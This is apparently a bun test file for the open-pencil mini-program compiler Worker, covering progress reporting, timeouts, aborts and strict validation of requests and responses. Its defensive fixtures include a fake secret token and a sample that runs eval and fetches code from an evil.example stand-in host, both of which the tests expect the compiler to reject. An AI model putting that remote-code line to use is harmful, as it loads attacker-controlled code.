import { describe, expect, test } from 'bun:test'

import {
  withDefaults,
  type CompilerInput,
  type MiniProgramCompilerTarget
} from '@open-pencil/compiler'
import { SceneGraph } from '@open-pencil/scene-graph'

import {
  installMiniProgramSourceCompilerWorkerBootstrap,
  type MiniProgramSourceCompilerWorkerBootstrapScope,
  type MiniProgramSourceCompilerWorkerRuntime
} from '@/app/plugins/host/miniprogram/compiler/bootstrap'
import {
  createMiniProgramSourceCompiler,
  type MiniProgramSourceCompilerWorkerLike
} from '@/app/plugins/host/miniprogram/compiler/client'
import {
  MINIPROGRAM_SOURCE_COMPILER_WORKER_LIMITS,
  MINIPROGRAM_SOURCE_COMPILER_WORKER_PROTOCOL_VERSION,
  assertMiniProgramCompilerOutputForTransfer,
  createMiniProgramSourceCompilerWorkerRequest,
  parseMiniProgramSourceCompilerWorkerResponse,
  validateMiniProgramSourceCompilerWorkerRequest,
  type MiniProgramSourceCompilerWorkerRequest
} from '@/app/plugins/host/miniprogram/compiler/protocol'
import { executeMiniProgramSourceCompilerWorkerRequest } from '@/app/plugins/host/miniprogram/compiler/worker-runtime'

class FakeWorker implements MiniProgramSourceCompilerWorkerLike {
  onmessage: ((event: MessageEvent<unknown>) => void) | null = null
  onerror: ((event: ErrorEvent) => void) | null = null
  terminated = false

  constructor(
    private readonly respond: (
      request: MiniProgramSourceCompilerWorkerRequest,
      worker: FakeWorker
    ) => void = () => undefined
  ) {}

  postMessage(message: unknown): void {
    this.respond(message as MiniProgramSourceCompilerWorkerRequest, this)
  }

  terminate(): void {
    this.terminated = true
  }
}

class FakeBootstrapScope implements MiniProgramSourceCompilerWorkerBootstrapScope {
  readonly messages: unknown[] = []
  private listener: ((event: MessageEvent<unknown>) => void) | null = null

  addEventListener(_type: 'message', listener: (event: MessageEvent<unknown>) => void): void {
    this.listener = listener
  }

  postMessage(message: unknown): void {
    this.messages.push(message)
  }

  dispatch(data: unknown): void {
    this.listener?.({ data } as MessageEvent<unknown>)
  }
}

const ROUTERS = Object.freeze({
  'wechat-miniprogram': 'wechat-native',
  taro: 'taro-router',
  'uni-app': 'uni-pages',
  mpx: 'mpx-router'
} as const)

function input(target: MiniProgramCompilerTarget, graph = new SceneGraph()): CompilerInput {
  return {
    graph,
    pageIds: graph.getPages().map(({ id }) => id),
    options: withDefaults({
      packageName: `worker-${target}`,
      productName: 'Worker fixture',
      target,
      router: ROUTERS[target],
      devMode: false
    })
  }
}

async function flushQueue(): Promise<void> {
  await new Promise<void>((resolve) => {
    setTimeout(resolve, 0)
  })
}

describe('mini-program source compiler Worker', () => {
  test('reports worker-load before the heavy runtime resolves', async () => {
    const scope = new FakeBootstrapScope()
    let resolveRuntime!: (runtime: MiniProgramSourceCompilerWorkerRuntime) => void
    const runtimePromise = new Promise<MiniProgramSourceCompilerWorkerRuntime>((resolve) => {
      resolveRuntime = resolve
    })
    let executed: unknown = null
    installMiniProgramSourceCompilerWorkerBootstrap(scope, {
      loadRuntime: () => runtimePromise,
      now: () => 12
    })
    const request = createMiniProgramSourceCompilerWorkerRequest(
      input('wechat-miniprogram'),
      'bootstrap-request-0001'
    )

    scope.dispatch(request)
    expect(scope.messages).toEqual([
      {
        version: MINIPROGRAM_SOURCE_COMPILER_WORKER_PROTOCOL_VERSION,
        type: 'progress',
        requestId: request.requestId,
        stage: 'worker-load',
        elapsedMs: 0
      }
    ])

    resolveRuntime({
      async executeMiniProgramSourceCompilerWorkerRequest(value: unknown) {
        executed = value
      }
    })
    await flushQueue()
    expect(executed).toBe(request)
  })

  test('runs the exact progress chain and reports custom-font fallback from an empty manifest', async () => {
    const graph = new SceneGraph()
    const [page] = graph.getPages()
    graph.createNode('TEXT', page.id, {
      text: 'Font omission fixture',
      fontFamily: 'Worker Custom Font',
      fontWeight: 700
    })
    const request = createMiniProgramSourceCompilerWorkerRequest(
      input('wechat-miniprogram', graph),
      'runtime-font-request-0001'
    )
    const scope = new FakeBootstrapScope()
    installMiniProgramSourceCompilerWorkerBootstrap(scope, {
      loadRuntime: async () => ({ executeMiniProgramSourceCompilerWorkerRequest })
    })

    scope.dispatch(request)
    await flushQueue()

    expect(
      scope.messages
        .filter(
          (message): message is { type: 'progress'; stage: string } =>
            typeof message === 'object' &&
            message !== null &&
            Object.getOwnPropertyDescriptor(message, 'type')?.value === 'progress'
        )
        .map((message) => message.stage)
    ).toEqual(['worker-load', 'validate', 'restore', 'compile', 'audit'])
    const response = parseMiniProgramSourceCompilerWorkerResponse(
      scope.messages.at(-1),
      request.requestId
    )
    expect(response?.type).toBe('result')
    if (response?.type !== 'result') throw new Error('Expected a compiler result')
    expect(response.output.warnings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          code: 'font-face-unavailable',
          message: expect.stringContaining('Worker Custom Font')
        })
      ])
    )
  })

  test('returns an exact correlated error when the runtime chunk cannot load', async () => {
    const scope = new FakeBootstrapScope()
    installMiniProgramSourceCompilerWorkerBootstrap(scope, {
      loadRuntime: () => Promise.reject(new Error('private local path must not escape'))
    })
    const request = createMiniProgramSourceCompilerWorkerRequest(
      input('mpx'),
      'load-request-0000001'
    )

    scope.dispatch(request)
    await flushQueue()

    expect(scope.messages.at(-1)).toEqual({
      version: MINIPROGRAM_SOURCE_COMPILER_WORKER_PROTOCOL_VERSION,
      type: 'error',
      requestId: request.requestId,
      error: 'Mini-program compiler Worker runtime failed to load'
    })
  })

  test('accepts each reviewed target with its exact router and rejects extra authority', () => {
    for (const target of Object.keys(ROUTERS) as MiniProgramCompilerTarget[]) {
      const request = createMiniProgramSourceCompilerWorkerRequest(
        input(target),
        `reviewed-${target}-request`
      )
      expect(() => validateMiniProgramSourceCompilerWorkerRequest(request)).not.toThrow()
      expect(request.options.router).toBe(ROUTERS[target])

      expect(() =>
        validateMiniProgramSourceCompilerWorkerRequest({
          ...request,
          networkURL: 'https://example.invalid/runtime.js'
        })
      ).toThrow('unexpected fields')
      expect(() =>
        validateMiniProgramSourceCompilerWorkerRequest({
          ...request,
          options: { ...request.options, credentials: 'blocked' }
        })
      ).toThrow('unexpected fields')
      expect(() =>
        validateMiniProgramSourceCompilerWorkerRequest({
          ...request,
          pageIds: [request.graph.rootId]
        })
      ).toThrow('page ids are invalid')
    }
  })

  test('accepts only public root-level Canvas pages', () => {
    const request = createMiniProgramSourceCompilerWorkerRequest(
      input('wechat-miniprogram'),
      'page-identity-request'
    )
    const [pageId] = request.pageIds
    const mutatePage = (changes: Record<string, unknown>) => ({
      ...request,
      graph: {
        ...request.graph,
        nodes: request.graph.nodes.map(([id, node]) => [
          id,
          id === pageId ? { ...node, ...changes } : node
        ])
      }
    })

    expect(() => validateMiniProgramSourceCompilerWorkerRequest(request)).not.toThrow()
    expect(() =>
      validateMiniProgramSourceCompilerWorkerRequest(mutatePage({ type: 'FRAME' }))
    ).toThrow('page ids are invalid')
    expect(() =>
      validateMiniProgramSourceCompilerWorkerRequest(mutatePage({ type: 'PAGE' }))
    ).toThrow('page ids are invalid')
    expect(() =>
      validateMiniProgramSourceCompilerWorkerRequest(mutatePage({ parentId: pageId }))
    ).toThrow('page ids are invalid')
    expect(() =>
      validateMiniProgramSourceCompilerWorkerRequest(mutatePage({ internalOnly: true }))
    ).toThrow('page ids are invalid')
  })

  test('terminates after a correlated result and ignores an unrelated response', async () => {
    const source = input('wechat-miniprogram')
    const bytes = new Uint8Array([1, 2, 3])
    source.graph.images.set('asset', bytes)
    const worker = new FakeWorker((request, current) => {
      current.onmessage?.({
        data: {
          version: MINIPROGRAM_SOURCE_COMPILER_WORKER_PROTOCOL_VERSION,
          type: 'result',
          requestId: 'unrelated-request-id',
          output: { files: new Map([['ignored.txt', 'ignored']]), warnings: [] }
        }
      } as MessageEvent)
      queueMicrotask(() =>
        current.onmessage?.({
          data: {
            version: MINIPROGRAM_SOURCE_COMPILER_WORKER_PROTOCOL_VERSION,
            type: 'result',
            requestId: request.requestId,
            output: {
              files: new Map<string, string | Uint8Array>([['app.json', '{}\n']]),
              warnings: []
            }
          }
        } as MessageEvent)
      )
    })
    const compiler = createMiniProgramSourceCompiler({ workerFactory: () => worker })

    await expect(compiler.compile(source)).resolves.toMatchObject({ warnings: [] })
    expect(worker.terminated).toBe(true)
    expect(source.graph.images.get('asset')).toBe(bytes)
    expect(bytes.byteLength).toBe(3)
  })

  test('aborts and terminates without detaching editor-owned image buffers', async () => {
    const source = input('taro')
    const bytes = new Uint8Array([4, 5, 6])
    source.graph.images.set('asset', bytes)
    const worker = new FakeWorker()
    const controller = new AbortController()
    const pending = createMiniProgramSourceCompiler({ workerFactory: () => worker }).compile(
      source,
      controller.signal
    )

    controller.abort()
    await expect(pending).rejects.toMatchObject({ name: 'AbortError' })
    expect(worker.terminated).toBe(true)
    expect(source.graph.images.get('asset')).toBe(bytes)
    expect(bytes.byteLength).toBe(3)
  })

  test('terminates on a synchronous post failure without detaching image buffers', async () => {
    const source = input('taro')
    const bytes = new Uint8Array([7, 8, 9])
    source.graph.images.set('asset', bytes)
    const worker = new FakeWorker()
    worker.postMessage = () => {
      throw new Error('Worker channel closed')
    }

    await expect(
      createMiniProgramSourceCompiler({ workerFactory: () => worker }).compile(source)
    ).rejects.toThrow('Worker channel closed')
    expect(worker.terminated).toBe(true)
    expect(source.graph.images.get('asset')).toBe(bytes)
    expect(bytes.byteLength).toBe(3)
  })

  test('fails before Worker creation when a complete binary backing exceeds the budget', async () => {
    const source = input('uni-app')
    const backing = new ArrayBuffer(MINIPROGRAM_SOURCE_COMPILER_WORKER_LIMITS.maxSnapshotBytes + 1)
    source.graph.images.set('oversize', new Uint8Array(backing, backing.byteLength - 1, 1))
    let workers = 0
    const compiler = createMiniProgramSourceCompiler({
      workerFactory() {
        workers += 1
        return new FakeWorker()
      }
    })

    await expect(compiler.compile(source)).rejects.toThrow(
      `exceeds ${MINIPROGRAM_SOURCE_COMPILER_WORKER_LIMITS.maxSnapshotBytes} bytes`
    )
    expect(workers).toBe(0)
  })

  test('rejects a correlated malformed response and enforces timeout cleanup', async () => {
    const malformed = new FakeWorker((request, current) => {
      queueMicrotask(() =>
        current.onmessage?.({
          data: {
            version: MINIPROGRAM_SOURCE_COMPILER_WORKER_PROTOCOL_VERSION,
            type: 'result',
            requestId: request.requestId,
            output: { files: new Map(), warnings: [] },
            extra: true
          }
        } as MessageEvent)
      )
    })
    await expect(
      createMiniProgramSourceCompiler({ workerFactory: () => malformed }).compile(input('mpx'))
    ).rejects.toThrow('invalid response')
    expect(malformed.terminated).toBe(true)

    const nestedOutput = new FakeWorker((request, current) => {
      queueMicrotask(() =>
        current.onmessage?.({
          data: {
            version: MINIPROGRAM_SOURCE_COMPILER_WORKER_PROTOCOL_VERSION,
            type: 'result',
            requestId: request.requestId,
            output: { files: new Map(), warnings: [], unexpected: true }
          }
        } as MessageEvent)
      )
    })
    await expect(
      createMiniProgramSourceCompiler({ workerFactory: () => nestedOutput }).compile(input('mpx'))
    ).rejects.toThrow('unexpected fields')
    expect(nestedOutput.terminated).toBe(true)

    const warningExtra = new FakeWorker((request, current) => {
      queueMicrotask(() =>
        current.onmessage?.({
          data: {
            version: MINIPROGRAM_SOURCE_COMPILER_WORKER_PROTOCOL_VERSION,
            type: 'result',
            requestId: request.requestId,
            output: {
              files: new Map(),
              warnings: [{ code: 'reviewed', message: 'Reviewed warning', unexpected: true }]
            }
          }
        } as MessageEvent)
      )
    })
    await expect(
      createMiniProgramSourceCompiler({ workerFactory: () => warningExtra }).compile(input('mpx'))
    ).rejects.toThrow('unexpected fields')
    expect(warningExtra.terminated).toBe(true)

    const progressExtra = new FakeWorker((request, current) => {
      queueMicrotask(() =>
        current.onmessage?.({
          data: {
            version: MINIPROGRAM_SOURCE_COMPILER_WORKER_PROTOCOL_VERSION,
            type: 'progress',
            requestId: request.requestId,
            stage: 'compile',
            elapsedMs: 1,
            extra: true
          }
        } as MessageEvent)
      )
    })
    await expect(
      createMiniProgramSourceCompiler({ workerFactory: () => progressExtra }).compile(input('mpx'))
    ).rejects.toThrow('invalid response')
    expect(progressExtra.terminated).toBe(true)

    const timedOut = new FakeWorker()
    await expect(
      createMiniProgramSourceCompiler({ workerFactory: () => timedOut, timeoutMs: 1 }).compile(
        input('mpx')
      )
    ).rejects.toThrow('exceeded 1ms')
    expect(timedOut.terminated).toBe(true)
  })

  test('uses stage progress as liveness while retaining a hard total ceiling', async () => {
    const stages: string[] = []
    const progressing = new FakeWorker((request, current) => {
      setTimeout(
        () =>
          current.onmessage?.({
            data: {
              version: MINIPROGRAM_SOURCE_COMPILER_WORKER_PROTOCOL_VERSION,
              type: 'progress',
              requestId: request.requestId,
              stage: 'compile',
              elapsedMs: 10
            }
          } as MessageEvent),
        10
      )
      setTimeout(
        () =>
          current.onmessage?.({
            data: {
              version: MINIPROGRAM_SOURCE_COMPILER_WORKER_PROTOCOL_VERSION,
              type: 'result',
              requestId: request.requestId,
              output: { files: new Map([['app.json', '{}\n']]), warnings: [] }
            }
          } as MessageEvent),
        20
      )
    })
    await expect(
      createMiniProgramSourceCompiler({
        workerFactory: () => progressing,
        timeoutMs: 15,
        totalTimeoutMs: 50,
        onProgress: (stage) => stages.push(stage)
      }).compile(input('mpx'))
    ).resolves.toMatchObject({ warnings: [] })
    expect(stages).toEqual(['compile'])
    expect(progressing.terminated).toBe(true)

    const progressIntervals = new Set<ReturnType<typeof setInterval>>()
    const endless = new FakeWorker((request, current) => {
      const interval = setInterval(
        () =>
          current.onmessage?.({
            data: {
              version: MINIPROGRAM_SOURCE_COMPILER_WORKER_PROTOCOL_VERSION,
              type: 'progress',
              requestId: request.requestId,
              stage: 'audit',
              elapsedMs: 1
            }
          } as MessageEvent),
        5
      )
      progressIntervals.add(interval)
    })
    try {
      await expect(
        createMiniProgramSourceCompiler({
          workerFactory: () => endless,
          timeoutMs: 10,
          totalTimeoutMs: 25
        }).compile(input('mpx'))
      ).rejects.toThrow('25ms total limit during stage "audit"')
      expect(endless.terminated).toBe(true)
    } finally {
      for (const interval of progressIntervals) clearInterval(interval)
    }
  })

  test('rejects unsafe result and error payloads without echoing secret material', async () => {
    const secret = `sk-proj-${'u'.repeat(24)}`
    const unsafeResult = new FakeWorker((request, current) => {
      queueMicrotask(() =>
        current.onmessage?.({
          data: {
            version: MINIPROGRAM_SOURCE_COMPILER_WORKER_PROTOCOL_VERSION,
            type: 'result',
            requestId: request.requestId,
            output: {
              files: new Map([['src/private.ts', `export const token = '${secret}'`]]),
              warnings: []
            }
          }
        } as MessageEvent)
      )
    })
    const resultError = await createMiniProgramSourceCompiler({
      workerFactory: () => unsafeResult
    })
      .compile(input('taro'))
      .catch((cause: unknown) => cause)
    expect(resultError).toMatchObject({
      code: 'MINIPROGRAM_ARTIFACT_SECURITY',
      diagnostic: { code: 'secret-detected', source: 'text-content' }
    })
    expect((resultError as Error).message).not.toContain(secret)
    expect(unsafeResult.terminated).toBe(true)

    const unsafeError = new FakeWorker((request, current) => {
      queueMicrotask(() =>
        current.onmessage?.({
          data: {
            version: MINIPROGRAM_SOURCE_COMPILER_WORKER_PROTOCOL_VERSION,
            type: 'error',
            requestId: request.requestId,
            error: `Compiler failed near ${secret}`
          }
        } as MessageEvent)
      )
    })
    const workerError = await createMiniProgramSourceCompiler({ workerFactory: () => unsafeError })
      .compile(input('mpx'))
      .catch((cause: unknown) => cause)
    expect(workerError).toMatchObject({
      code: 'MINIPROGRAM_ARTIFACT_SECURITY',
      diagnostic: { code: 'secret-detected', source: 'worker-error' }
    })
    expect((workerError as Error).message).not.toContain(secret)
    expect(unsafeError.terminated).toBe(true)
  })

  test('rejects executable binary source before transfer and at the client boundary', async () => {
    const executableBytes = new TextEncoder().encode(
      "eval('remote'); fetch('https://evil.example/runtime.js')"
    )
    const output = {
      files: new Map<string, string | Uint8Array>([['src/runtime.js', executableBytes]]),
      warnings: []
    }

    expect(() => assertMiniProgramCompilerOutputForTransfer(output)).toThrow(
      'unreviewed or malformed binary artifact'
    )

    const unsafeBinaryResult = new FakeWorker((request, current) => {
      queueMicrotask(() =>
        current.onmessage?.({
          data: {
            version: MINIPROGRAM_SOURCE_COMPILER_WORKER_PROTOCOL_VERSION,
            type: 'result',
            requestId: request.requestId,
            output
          }
        } as MessageEvent)
      )
    })
    const error = await createMiniProgramSourceCompiler({ workerFactory: () => unsafeBinaryResult })
      .compile(input('taro'))
      .catch((cause: unknown) => cause)

    expect(error).toMatchObject({
      code: 'MINIPROGRAM_ARTIFACT_SECURITY',
      diagnostic: { code: 'unreviewed-binary-artifact', source: 'binary-metadata' }
    })
    expect(unsafeBinaryResult.terminated).toBe(true)
  })
})
